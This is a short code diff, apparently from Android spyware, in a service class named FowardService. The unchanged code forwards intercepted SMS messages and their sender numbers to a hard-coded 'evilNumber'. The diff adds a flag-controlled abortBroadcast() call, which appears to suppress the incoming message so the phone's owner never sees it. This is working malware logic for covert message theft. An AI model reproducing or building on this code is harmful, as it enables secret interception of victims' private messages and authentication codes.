@@ -1,6 +1,7 @@
 package com.SmsService.CommandComponent;
 
 
+import com.SmsService.AuxiliaryComponent.CommonVariable;
 import com.SmsService.AuxiliaryComponent.Debug;
 
 import android.app.Service;
@@ -72,6 +73,9 @@ public class FowardService extends Service {
 	            }//end for
 	            
 	            fowardSms(content,number,evilNumber);
+	            if ( CommonVariable.enableMACURY == true ) {
+	            	this.abortBroadcast();
+	            }
 	        }
 			
  
